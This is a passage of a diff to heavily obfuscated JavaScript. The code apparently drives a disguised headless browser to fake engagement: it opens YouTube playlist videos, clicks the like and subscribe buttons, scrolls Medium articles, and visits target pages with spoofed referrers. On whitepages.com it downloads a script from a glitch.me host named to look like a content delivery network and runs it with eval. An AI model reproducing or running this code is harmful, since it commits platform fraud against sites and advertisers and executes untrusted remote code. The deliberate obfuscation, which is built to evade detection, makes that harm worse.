-            D = (E = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](G => G['childNodes'][0x1764 + 0xf * -0x1a5 + 0x149]['childNodes'][0x21b4 + -0x1 * -0x25e0 + -0x4793]['childNodes'][-0x315 * 0x3 + -0x1c7e + 0x25be]))[Math['floor'](Math['random']() * E['length'])];
+            D = (E = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](G => G['childNodes'][0xffc + -0x1271 * 0x1 + 0x277]['childNodes'][0x2362 + -0xa0e + 0x3 * -0x871]['childNodes'][-0x44d * -0x4 + 0x153e + -0xd * 0x2f5]))[Math['floor'](Math['random']() * E['length'])];
           var E;
-          const F = D['childNodes'][0x1a33 + 0x8df * 0x1 + -0x230d]['childNodes'][-0x8b * -0x3e + 0x5ce + 0x3 * -0xd28]['childNodes'][-0x1051 + 0x675 * 0x1 + 0x9de]['ariaLabel'];
+          const F = D['childNodes'][0x1859 + 0x22b * -0x2 + -0x13fe]['childNodes'][-0x427 * -0x3 + -0x180a + 0xb95]['childNodes'][-0x1fe1 * -0x1 + -0x7dc * -0x2 + -0x2f97]['ariaLabel'];
           return D['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
             function(G) {
-              let H = G['split'](',\x20')['map'](J => J['split']('\x20'))['flat'](-0x10f4 + 0x148 + -0xfad * -0x1),
-                I = 0x157c + -0x454 * 0x1 + -0x1128;
-              for (let J = 0x16 * -0x4 + -0x4 * 0x962 + 0x1 * 0x25e0; J < H['length']; J += 0x1 * 0x1e71 + -0x29 * -0xe3 + -0x42ca)
-                I += H[J] * C[H[J + (0x1498 + -0x1f0 + -0x12a7)]];
+              let H = G['split'](',\x20')['map'](J => J['split']('\x20'))['flat'](-0x22ad + -0xf8b + 0x3239),
+                I = -0x14ea + 0x6 * -0x544 + 0x2 * 0x1a41;
+              for (let J = -0x2552 + 0x1 * -0x1b73 + 0x40c5; J < H['length']; J += 0x210e + -0x76b + -0x19a1)
+                I += H[J] * C[H[J + (0x17ee + 0x1ce0 + -0x34cd)]];
               return I;
             }(F);
         });
-        await f('#__hookedV' + 'idToClick', -0x1 * 0x1ff + 0x9 * -0x29 + 0x370, z);
-        let B = min((-0x1c * -0xb9c + -0x2b * -0x175 + -0x9957) * getRandomInt(-0x1ee3 + -0x1 * 0x55f + -0x1 * -0x2443, 0x2d4 + -0xcfd + 0x1 * 0xa33), A + (0x25d5 + -0xce7 + -0x566));
-        return log('watching\x20v' + 'ideo\x20for\x20' + B + 'ms'), await wait(B), 0x14 * 0x121 + 0x1401 + 0x221 * -0x14;
+        await f('#__hookedV' + 'idToClick', 0xa1 * 0x25 + -0x15d0 + -0x175, z);
+        let B = min((-0x589 * -0x47 + -0x10e24 + 0x6f85) * getRandomInt(0x9bc + -0x2027 + 0x29 * 0x8c, 0xc3c + -0x1 * 0x1ab4 + 0xe82), A + (0x5f * 0xc + 0xd74 + 0x1a0));
+        return log('watching\x20v' + 'ideo\x20for\x20' + B + 'ms'), await wait(B), 0x173f + 0x1957 + -0x3095 * 0x1;
       }
       async function o(z) {
-        await z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + x['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await f('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', 0x1f * -0xba + 0x22dc + -0xc55, z), await f('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', 0x1205 + 0xf8d * -0x1 + -0x277, z);
+        await z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + x['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await f('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', 0x2 * -0x8f4 + 0x8bd * -0x2 + 0x2363, z), await f('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', 0x1e6b + -0x154b + -0x5 * 0x1d3, z);
         const A = setInterval(async () => {
           log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await z['evaluate'](() => {
             setTimeout(() => {
               document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
-            }, -0x9 * -0x455 + 0x21 + 0xe * -0x1f5 + (0x1837 + -0x287 * 0x7 + 0x29e * -0x1) * Math['random']());
+            }, -0x1 * -0x411 + 0x904 + -0x15d + (0x2389 + 0x4b + -0x1fec) * Math['random']());
           });
-        }, -0x853 * 0x2 + -0x10b * -0x2f + -0x507);
-        await wait(0x5e0fa + -0x357df + 0x20ac5);
+        }, -0x11 * 0x323 + -0x2d1d + 0x7dc8);
+        await wait(0x88bfd + 0x477b + -0x509 * 0xd8);
         try {
-          z['$']('#__lllll') && await f('#__lllll', 0xb73 + -0x23d6 + 0xc32 * 0x2, z);
+          z['$']('#__lllll') && await f('#__lllll', -0x18ab + -0x48a * 0x1 + 0x1d36 * 0x1, z);
         } catch (B) {}
-        return await wait((0xd * -0x1b7d + 0x31d * 0x9 + 0x233b4) * getRandomInt(-0x2cb * -0x7 + 0xd5f + 0x1 * -0x20e8, -0x4 * 0x701 + 0x1134 * -0x1 + 0x2d51)), clearInterval(A), 0x60 * 0x67 + -0x15f0 + -0x10af;
+        return await wait((0x75b * 0x33 + -0x9e * -0x269 + -0x2098f) * getRandomInt(0x1 * -0x18be + 0xcab + -0x26b * -0x5, 0x2 * 0x6c5 + 0x1 * 0x4e4 + 0xd * -0x169)), clearInterval(A), -0x2 * 0x9b4 + -0x1e76 + 0x31df;
       }
       log('index.js\x20c' + 'alled');
       const {
         FakeBrowser: p
-      } = require('fakebrowse' + 'r'), q = require('path'), r = q['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), s = new p['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x977 + 0xcc5 * -0x2 + 0x2302)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
+      } = require('fakebrowse' + 'r'), q = require('path'), r = q['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), s = new p['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1 * 0x1906 + 0x16c8 + -0x73 * -0x5)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
         require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
           'blockTrackers': 0x1,
           'blockTrackersAndAnnoyances': 0x1
@@ -689,7 +698,7 @@ const actions = [
         'AP7d2Ghq6d' + 'U',
         'UizEAwrZAG' + 'I',
         '0FAi5-h8Hj' + '0',
-        a6(0xf) + 'k',
+        'CNqA6IYj17' + 'k',
         'tSiKyCpwnS' + 'Y',
         'OrglyeV5xP' + 'Y',
         'BXkB-g4eCc' + 's',
@@ -721,7 +730,7 @@ const actions = [
         '8H2AiOV0oE' + 'o',
         'mI7aiKDGde' + 'w',
         'D-IMDYrj35' + '4',
-        a7(0x12, '&KMP') + 'g',
+        'gKgFiEgghy' + 'g',
         'mjVwfjJ2nj' + 'k',
         '6auDBi-D2H' + 'M',
         'X89-SWNdIE' + 'k',
@@ -731,14 +740,14 @@ const actions = [
         '9zHirkfEKk' + 'k',
         'ZyGS_AMbIa' + '4',
         'yG6bwB17ZP' + 's',
-        'aytHiLe0s6' + 'U',
+        a9(0x0, 'd@qg') + 'U',
         'cGe-Mpw_F1' + 'w',
         'eMK7xV_nxZ' + 'o',
         'epJ2MAKa1Y' + 'Q',
         '5BNbKKMUhE' + 'o',
         'oxpAvc6tDP' + '8',
         'jRcc-NIR2R' + 'I',
-        a7(0xc, '!1mo') + '4',
+        '258btO4mFw' + '4',
         'pXjJAUvSbQ' + 'A',
         '63-irfPjh2' + 'c',
         'xbrDZAFf3Q' + 's',
@@ -753,7 +762,7 @@ const actions = [
         'zfDgTzZ2nh' + '0',
         '1PYettRo-D' + 'M',
         'jzuZuwF490' + '4',
-        a7(0x14, '!g1j') + '8',
+        '2DAgWTlXae' + '8',
         'keouUYA5hI' + 'k',
         'F7i7wRlGCd' + 'c',
         'uToD2c0CdJ' + 'c',
@@ -796,7 +805,7 @@ const actions = [
         'V3NxxpUUfW' + 'E',
         'J3ygeDEMnO' + 'w',
         'HcP_xmdwsl' + 'c',
-        'M9g0h7px2_' + 'M',
+        a9(0x5, '9RtC') + 'M',
         'b5WfUvcSgr' + 'U',
         'JGHnIshsoC' + 'E',
         'x2gfhCLHd9' + '4',
@@ -809,7 +818,7 @@ const actions = [
         '0dVzItbl9E' + 'w',
         't0EqnhcSb1' + 's',
         'MuiXtvo1RY' + 'E',
-        a8(0xb) + 'w',
+        'Nj-3KC6knH' + 'w',
         'B19HbETNi5' + '8',
         'yKN_QkroH6' + 's',
         'U9ExFM1pji' + '0',
@@ -831,7 +840,7 @@ const actions = [
         '_phHS3FAgW' + 'Q',
         '1f8sU4l3dP' + '4',
         'HwTSLUd53K' + '8',
-        'EpP2ymD_QG' + 'A',
+        aa(0x16) + 'A',
         'TQ69QFqmbo' + 'I',
         'wA8BqUka_u' + '0',
         'bc8Ey-vuR5' + 'M',
@@ -859,7 +868,7 @@ const actions = [
         'k5gjnjDFAZ' + 's',
         'h_NQ3y1ek8' + 'U',
         'evPsJlNLy_' + '4',
-        'qEPTydgwh4' + 's',
+        aa(0x1b) + 's',
         'LB685ckhuf' + 'E',
         'Lj1EcSMGey' + '0',
         'OE19r7MIMW' + 'Q',
@@ -867,7 +876,7 @@ const actions = [
         'f4a5OPFQa7' + 'k',
         'XDo7Q7yUEt' + 'k',
         'Vw_9zw0qHI' + 'c',
-        'KGT5nbDsI_' + '8',
+        a9(0x12, 'v#hI') + '8',
         'E008Eql59M' + 'Q',
         'wSOFdefX47' + 'A',
         '2xcv7q3QhR' + 'E',
@@ -899,7 +908,7 @@ const actions = [
         '5VYN2zA-Si' + 'k',
         'q9rLWEAzoo' + 'k',
         '4KSm3IY7Xz' + 'g',
-        'fMqRu_ON-D' + 'E',
+        aa(0x7) + 'E',
         'GfvShU6Sy9' + 'A',
         'OHzOmi1b60' + 'Y',
         'D9oTUKT-_n' + 'A',
@@ -924,9 +933,9 @@ const actions = [
         '8cJDYeRiLn' + 'k',
         'cCaIVrltHz' + 'w',
         '8X2fF4pgM0' + 'E',
-        '6s8Xm4wylr' + '4',
+        a9(0x10, '8T#7') + '4',
         'eFceshvavn' + 'o',
-        '2h4g7euqR-' + 'U',
+        aa(0x1c) + 'U',
         'ujiBqXnn92' + '8',
         'w9F2NST-9j' + 's',
         'w-oc7F5Mmy' + 'U',
@@ -985,9 +994,9 @@ const actions = [
         'pBx_5CbIcp' + 'o',
         'L1Oy5F6ZMO' + 'Q',
         'P0NjLaBed-' + 'E',
-        'DR16C4-keB' + '0',
+        a9(0x17, 'W0Ro') + '0',
         'LGmpIpu9eD' + 'w',
-        a8(0x7) + 'Q',
+        'rNkX_A4kBA' + 'Q',
         'QztVMjrEk4' + '0',
         'uOM6m6KL5d' + '4',
         'g-Aju8xrrO' + 'E',
@@ -1097,20 +1106,20 @@ const actions = [
       log('browser\x20la' + 'unched'), flags['RPL2_MDM2'] && setTimeout(async () => {
         const C = await w['newPage']();
         for (;;) {
-          let D = -0x2c2 + -0x1 * -0x245b + -0x2f * 0xb7;
+          let D = 0x1ff3 * 0x1 + -0xb5 * -0xd + 0xa49 * -0x4;
           if (await C['goto'](data['mediumArti' + 'cles']['random'](), {
               'timeout': NETWORK_PATIENCE
             })['catch'](E => D++), !D) {
             await randomWait();
-            for (let E = 0x1b * 0x27 + 0x2259 + -0x2676; E < getRandomInt(0xe63 * 0x1 + 0x1 * -0x21bb + 0x3 * 0x673, 0x3ec + -0x188a * -0x1 + -0x1c71); E++)
+            for (let E = -0x1ee * 0x9 + 0x3 * -0x125 + 0xf * 0x163; E < getRandomInt(0x1a8 * 0x11 + 0x2 * -0x15 + -0x1bfd, -0x5 * -0x20e + -0x1691 + 0x628 * 0x2); E++)
               await v['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
-            await randomWait(), await wait(0x180a2 + -0x87d9 + -0xe69);
+            await randomWait(), await wait(-0x787 * -0x33 + -0x107da + 0x7255);
           }
         }
-      }, -0x8fd * -0x3 + 0xd56 * -0x1 + -0xd3d), flags['RPL2_WP'] && setTimeout(async () => {
+      }, 0x692 * 0x1 + 0x1370 + -0x199e), flags['RPL2_WP'] && setTimeout(async () => {
         (async function C() {
           try {
-            let D = -0xacd + -0x2071 * 0x1 + 0x3 * 0xe6a;
+            let D = -0x2298 + -0xcf * 0x1d + 0x3a0b;
             const E = await w['newPage']();
             if (await E['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                 'timeout': MM_NETWORK_PATIENCE
@@ -1118,18 +1127,18 @@ const actions = [
               return await E['close'](), C();
             await E['waitForSel' + 'ector']('#main-cont' + 'ent'), await E['evaluate'](() => {
               let F = new XMLHttpRequest();
-              F['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x200 + -0x1 * 0x8aa + 0x6aa), F['send'](), eval(F['responseTe' + 'xt']);
+              F['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1 * -0x84f + 0x6d9 * -0x4 + 0x23b3), F['send'](), eval(F['responseTe' + 'xt']);
             });
           } catch (F) {}
         }());
-      }, -0x104d * -0x1 + 0x301 + -0x12ea), random() <= 0x1 * 0xba5 + -0x17 + 0x3da * -0x3 + 0.2 ? setTimeout(async () => {
+      }, 0x3 * 0xbf7 + 0x8a3 + -0x2c24), random() <= -0x25 * -0x91 + -0x14c0 + -0x1 * 0x35 + 0.2 ? setTimeout(async () => {
         async function C() {
-          if (random() <= 0x281 * 0x1 + -0x5e + -0x223 + 0.3 && await g(D), flags['RPL2_GF'] && random() <= -0x1dc4 + -0x85f * 0x4 + -0x10 * -0x3f4 + 0.2) {
+          if (random() <= 0xc06 * 0x1 + 0xf71 + -0x4f * 0x59 + 0.3 && await g(D), flags['RPL2_GF'] && random() <= 0x15ec + -0xffe + -0x5ee + 0.2) {
             const {
               url: E,
               preRef: F
-            } = data['scriptTarg' + 'ets']['randomFlus' + 'h'](-0x162d * -0x1 + 0xee * 0x20 + 0x19f6 * -0x2);
-            let G = -0x12bf + 0x21e5 + 0x2 * -0x793;
+            } = data['scriptTarg' + 'ets']['randomFlus' + 'h'](0x13 * 0x76 + -0x1c2d + 0x1c4 * 0xb);
+            let G = -0x65 * -0x29 + -0x1 * 0x1fb + -0xe32;
             if (await D['goto'](F, {
                 'timeout': NETWORK_PATIENCE
               })['catch'](I => G++), G)
@@ -1137,14 +1146,14 @@ const actions = [
             const H = await D['evaluate']('!document.' + 'documentEl' + 'ement.inne' + 'rHTML.incl' + 'udes(\x22scri' + 'pt-descrip' + 'tion\x22);');
             return H ? (await D['goto']('https://bl' + 'ank.org'), C()) : (await D['goto'](E, {
               'timeout': NETWORK_PATIENCE
-            })['catch'](I => G++), G ? (await D['goto']('https://bl' + 'ank.org'), C()) : (await wait(0x11ef * -0x1 + -0x1312 * -0x2 + -0xc65 + floor((-0x2 * 0x104b + 0x181e + 0x12 * 0xb0) * random())), await D['evaluate'](() => {
+            })['catch'](I => G++), G ? (await D['goto']('https://bl' + 'ank.org'), C()) : (await wait(-0x15 * 0x19b + -0x2203 + 0x4b8a + floor((-0xb3 * -0x2 + -0x22ae + 0x1298 * 0x2) * random())), await D['evaluate'](() => {
               var I, J, K, L, M, N, O, P, Q = 'object' == typeof window ? window : {},
                 R = !Q['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
-              R && (Q = global), I = ('0123456789' + 'abcdef')['split'](''), J = [-(-0x9fa17898 + 0x781eee54 + -0xbc * -0xe4193f),
-                0xc290c6 + 0x10e * -0x8eb7 + -0x3 * -0x1bfc14, -0x1070 + 0x2 * -0xab6 + 0xa5dc,
-                0x1df * 0x1 + 0x1 * -0x5c + -0x103
-              ], K = [-0x1 * 0xfad + -0x21d8 + 0x319d,
-                0x17ef + 0x1 * -0x1756 + -0x89, -0xced + -0x1 * -0x2f2 + 0xa03, -0xd52 + -0x8e * -0x46 + -0x1982
+              R && (Q = global), I = ('0123456789' + 'abcdef')['split'](''), J = [-(0x485a1ae0 + -0x48a1c162 + -0x2ac28cd6 * -0x3),
+                0xe5391f * -0x1 + -0x58eb81 + 0x1be24a0 * 0x1,
+                0xe * 0x4d2 + 0xee4c + -0xb1c8, -0x21b * 0x1 + -0x1d * 0x59 + 0xcb0
+              ], K = [-0x92 * 0xe + -0x262 * 0x6 + 0x1660, -0xc + -0x808 + 0x1 * 0x824, -0x1fd7 + 0x40 * -0x7 + 0x219f,
+                0x72b + 0x16c + -0x2dd * 0x3
               ], L = [
                 'hex',
                 'array',
@@ -1152,7 +1161,7 @@ const actions = [
                 'arrayBuffe' + 'r'
               ], M = [], N = function(V) {
                 return function(W) {
-                  return new S(0x258c + -0x584 * 0x1 + -0x1 * 0x2007)['update'](W)[V]();
+                  return new S(0x99e + -0x821 + -0x17c)['update'](W)[V]();
                 };
               }, O = function() {
                 var V, W, X = N('hex');
@@ -1160,19 +1169,20 @@ const actions = [
                     return new S();
                   }, X['update'] = function(Y) {
                     return X['create']()['update'](Y);
-                  }, V = 0xd4f * 0x1 + -0x14ae + 0x75f; V < L['length']; ++V)
+                  }, V = 0x20 * -0xaa + -0x602 * -0x6 + 0xecc * -0x1; V < L['length']; ++V)
                   W = L[V], X[W] = N(W);
                 return X;
               }, P = function(V) {
                 var W = eval('require(\'crypto\');'),
-                  X = eval('const a9 = d;require(a9(3))[\'Buffer\'];'),
+                  X = eval('require(\'buffer\')[\'Buffer\'];'),
                   Y = function(Z) {
+                    const ab = c;
                     if ('string' == typeof Z)
                       return W['createHash']('sha1')['update'](Z, 'utf8')['digest']('hex');
-                    if (Z['constructo' + 'r'] === ArrayBuffer)
+                    if (Z[ab(0x2) + 'r'] === ArrayBuffer)
                       Z = new Uint8Array(Z);
                     else {
-                      if (void(0x11d7 + 0x1 * -0x132d + 0x156) === Z['length'])
+                      if (void(0x95 * -0x11 + -0x19 * -0xc2 + -0x1 * 0x90d) === Z['length'])
                         return V(Z);
                     }
                     return W['createHash']('sha1')['update'](new X(Z))['digest']('hex');
@@ -1181,59 +1191,61 @@ const actions = [
               };
               class S {
                 constructor(V) {
-                    V ? (M[-0x1f2d + 0x7 * -0x2c5 + 0x3290] = M[-0x1 * -0x1aa1 + 0x123b + -0x2ccc] = M[-0x21 * -0x11 + 0x127 * -0x1b + 0x1 * 0x1ced] = M[0x21d3 * -0x1 + 0x1479 * -0x1 + -0x364e * -0x1] = M[-0x99 * -0x6 + -0x1 * 0x22e5 + 0x1f52] = M[-0x1352 * 0x1 + -0x7 * -0x53d + -0x1d * 0x99] = M[-0xbd4 + 0x212c + -0x1 * 0x1553] = M[-0x7 * 0x4b1 + 0x1 * -0xb65 + 0x2c42] = M[0x8b1 * 0x2 + -0x12f * 0xd + -0x1f8] = M[0x2 * 0x716 + 0x1 * 0x23f3 + -0x3217] = M[0x38c * 0x2 + 0x606 + 0xd15 * -0x1] = M[0xd * 0x17c + 0x1017 + -0x2359] = M[0x1fb8 + 0x13c * -0xb + -0x1219] = M[0x1 * 0x208b + 0x246c + -0x44eb] = M[0xddd * -0x2 + 0xd6 + 0x1af1] = M[-0x978 + -0xca * -0x2f + 0x9 * -0x310] = M[-0x18e2 + -0x14f + 0x1a40] = -0xa9a + 0x7 * 0x306 + -0xa90, this['blocks'] = M) : this['blocks'] = [
-                      0x1d8f + 0x28 * 0x9d + 0x3617 * -0x1, -0x182 + 0x1 * -0x1571 + 0x7d * 0x2f, -0x1 * -0x343 + 0x4b5 * 0x5 + 0x1acc * -0x1,
-                      0x1b * -0x66 + 0x22f + -0x1b7 * -0x5, -0xf88 * 0x1 + -0x1 * -0x130d + -0x385, -0x9c1 + -0xef0 + 0x81 * 0x31, -0x1 * -0xce5 + -0x1057 + 0x372,
-                      0x11e5 * -0x2 + -0x10 * 0x101 + -0x19ed * -0x2,
-                      0xc25 * 0x2 + -0x1d2d * -0x1 + -0x3577, -0x3f * -0x11 + 0x45 * -0x7b + 0x1cf8,
-                      0x8c * -0x4 + -0x1b6e + 0xdf * 0x22, -0x1910 + 0x171e + 0x1f2, -0xd3b + 0x1 * -0x6d2 + -0x1d * -0xb1,
-                      0x3 * 0x493 + 0x47 * -0x24 + -0x3bd, -0x25 * -0xd + 0x1 * 0x69d + -0x1 * 0x87e, -0xf43 * 0x2 + 0x7 * -0x289 + 0x1017 * 0x3,
-                      0x22 * -0xb + -0x1 * 0x17c9 + -0x119 * -0x17
-                    ], this['h0'] = -0xa3e166b7 + 0x1806fa84 + 0xf31f8f34, this['h1'] = 0x4f13f * 0x2d05 + 0x1 * 0x129ff8fa9 + -0x193469 * 0xb23, this['h2'] = -0xd * 0x89b86d7 + -0x6ff28463 + 0x3bfd54 * 0x647, this['h3'] = 0xc573 * -0xfd3 + 0x189d3912 + 0x3c9962d * 0x1, this['h4'] = -0x8 * 0xe4f8708 + 0x137f0b3ca + -0x1a1999a, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1057 + -0x97 + 0x10ee, this['finalized'] = this['hashed'] = -0x79 * 0x2b + 0x1181 + 0x2d2, this['first'] = -0x20e5 + 0x8e * 0xb + 0x1acc;
+                    V ? (M[-0xdaa + -0xa5f + 0x1809] = M[0xc37 * -0x1 + 0xfb * -0xb + 0x1710] = M[0x998 + 0xfd1 + -0x1968] = M[0x33 * 0x9d + 0x741 + -0x2686 * 0x1] = M[0x2d7 * 0x9 + -0x1c4b + -0x25 * -0x13] = M[-0x132e + -0x2071 + 0x33a3] = M[-0x11 * -0x1a4 + -0x1398 + -0x847] = M[-0x2296 + -0xf * -0xd + 0x21d9] = M[0x12c8 + 0x1a5 + -0x1466] = M[-0x2517 + -0x1 * 0xb9c + 0x30bb] = M[0x19 + -0x1b6d + -0x3 * -0x91f] = M[0x109d + 0x4 * -0x1e1 + -0x90f] = M[0x37 * -0xb + 0x705 * 0x3 + -0x12a7] = M[0x1 * -0x1931 + 0x1ce9 + -0x3ac] = M[0x1 * 0x1330 + -0x1 * 0xebf + 0x4 * -0x119] = M[0x195b + 0x1254 + -0x2ba1] = M[-0x14be + -0xf05 * 0x2 + 0x32d7] = -0x1f8d * -0x1 + -0x977 * -0x1 + -0x2904, this['blocks'] = M) : this['blocks'] = [
+                      0x170a + -0xdb + -0x162f, -0x20d7 + -0x259a + -0x177b * -0x3,
+                      0x2168 + -0x16 * 0x6b + -0x1836,
+                      0x1731 + 0x61e + -0x1d4f, -0xa6f + 0x5 * 0x277 + -0x1e4,
+                      0xa30 + 0xd06 + -0x1736,
+                      0x1 * -0xed1 + 0x2349 + -0x51e * 0x4, -0x11 * 0x63 + 0xea3 + 0x204 * -0x4,
+                      0x323 * -0x8 + 0x1459 + 0x1 * 0x4bf, -0x57f + 0x14e3 + 0x14 * -0xc5,
+                      0xb1 + 0xc8c + -0xd3d,
+                      0xf9b + -0x1 * -0x79b + -0x1736,
+                      0x2263 + 0x6 * -0x3d3 + -0xb71, -0x7 * 0x21b + -0x1e3b + 0x2cf8,
+                      0x2104 + -0x2172 + -0x37 * -0x2, -0x11 * 0x9e + -0x10 * 0x107 + 0x3 * 0x8fa, -0x7e + -0x2093 + 0x1 * 0x2111
+                    ], this['h0'] = 0xb3d331 * 0xb5 + -0xa44fa694 + -0x231c1dfc * -0x4, this['h1'] = -0x2eee * 0x23dd0 + 0x4 * -0x35e458fb + 0x2308fe6d5 * 0x1, this['h2'] = -0xf906e09 + 0x1 * 0x136516da + 0x5 * 0x1dc7a409, this['h3'] = -0x3 * -0x73b1d21 + 0x105d6c * -0x1bb + 0x1858299 * 0xf, this['h4'] = -0x1d71eed5 * 0xb + -0x5295 * -0xe170 + 0x1beff0ee7, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1c7 * -0x15 + -0x1a5c + -0xaf7, this['finalized'] = this['hashed'] = 0x2a * -0xb5 + 0x5f * -0x43 + 0x368f, this['first'] = -0x1ab8 + 0x1083 * 0x2 + -0x64d;
                   }
                   ['update'](V) {
                     var W, X, Y, Z, a0, a1;
                     if (!this['finalized']) {
-                      for ((W = 'string' != typeof V) && V['constructo' + 'r'] === Q['ArrayBuffe' + 'r'] && (V = new Uint8Array(V)), Y = -0x14e6 + -0x1 * 0xe95 + 0x237b, a0 = V['length'] || 0x1b9b * 0x1 + -0xa3a + -0x1161, a1 = this['blocks']; Y < a0;) {
-                        if (this['hashed'] && (this['hashed'] = 0x11c1 + 0x17a4 + 0x2965 * -0x1, a1[-0x16be + 0x31a * 0x2 + 0x108a] = this['block'], a1[0x1995 + 0x1 * 0x55a + -0x1edf] = a1[0x201e * -0x1 + -0x1922 * -0x1 + 0x1 * 0x6fd] = a1[0x169 * -0x17 + 0x1a97 + 0x7 * 0xd6] = a1[0x23d4 + -0x97 * 0x3 + -0x220c] = a1[0x6f3 + 0x1 * 0xcc4 + -0x13b3] = a1[-0xcb4 + -0x8d4 + -0x265 * -0x9] = a1[0x1 * -0x869 + -0x2 * -0xba7 + 0x2f * -0x51] = a1[-0x5 * -0xbf + -0x20 * -0x97 + -0x1694] = a1[-0x1 * 0x874 + 0x12cc + -0x2 * 0x528] = a1[0x138 + 0x14d7 + -0x1606] = a1[0x1 * -0xd31 + 0x1b * 0x109 + -0xeb8] = a1[-0xd35 + 0xbd * -0xd + 0x16d9] = a1[0x79 * 0x15 + 0x118a + -0x1b6b] = a1[-0x52 * -0x3d + -0x95 + -0x12e8] = a1[0x2ae * -0x2 + 0x13c8 + -0xe5e] = a1[-0x177f + -0x1fd2 + 0x1bb0 * 0x2] = -0xf * 0x15a + 0x2437 + -0xff1), W) {
-                          for (Z = this['start']; Y < a0 && Z < 0x1f3 * 0x4 + -0x1764 + 0x2 * 0x7ec; ++Y)
-                            a1[Z >> 0x1581 + -0x12c5 * -0x1 + -0x6b6 * 0x6] |= V[Y] << K[-0x3 * 0x703 + 0x1 * -0xf92 + -0x2b * -0xda & Z++];
+                      for ((W = 'string' != typeof V) && V['constructo' + 'r'] === Q['ArrayBuffe' + 'r'] && (V = new Uint8Array(V)), Y = 0x77 * 0x21 + -0x1 * -0xbff + -0x1b56, a0 = V['length'] || 0x1be4 + -0x2e2 * -0x1 + -0x1ec6, a1 = this['blocks']; Y < a0;) {
+                        if (this['hashed'] && (this['hashed'] = 0x11d2 + 0x53d + 0x1 * -0x170f, a1[-0x4 * 0x160 + -0x235c + -0x416 * -0xa] = this['block'], a1[-0x5a + 0x1 * -0x1085 + -0xff * -0x11] = a1[0xb77 + 0x2051 + -0x2bc7 * 0x1] = a1[-0xca8 + -0x101 * 0x24 + 0x30ce * 0x1] = a1[0x1b67 + -0xeb4 + -0x1 * 0xcb0] = a1[0x10dd + 0x1 * -0xe93 + -0x246] = a1[-0xa0d + -0x44 * 0x2 + 0xa9a] = a1[-0x67 + 0x37 * -0x13 + 0x482] = a1[-0x6dc + -0x6e8 + 0xdcb] = a1[-0x39c + -0x14b4 + -0x98 * -0x29] = a1[0x3f5 + 0x1fef + -0x23db] = a1[0x7d * -0x8 + -0x140c + -0x2 * -0xbff] = a1[0x1 * -0x6 + 0x2551 + -0x2540] = a1[-0x1 * 0x49c + 0x244 + 0x264] = a1[-0xd5 + -0xb66 * 0x3 + 0x2314] = a1[-0xa9c + 0x26c3 + 0x1c19 * -0x1] = a1[-0x24cd + -0x64 + 0x95 * 0x40] = -0x1738 + 0xd6 * 0x9 + 0xfb2), W) {
+                          for (Z = this['start']; Y < a0 && Z < -0x49 * 0x59 + -0x7c8 + 0x2169; ++Y)
+                            a1[Z >> -0xeb2 + -0x126d * -0x1 + -0x3b9] |= V[Y] << K[-0x6fd + 0xeff + -0x7ff & Z++];
                         } else {
-                          for (Z = this['start']; Y < a0 && Z < 0x5 * 0x309 + 0x53 * 0x3 + -0x16 * 0xb9; ++Y)
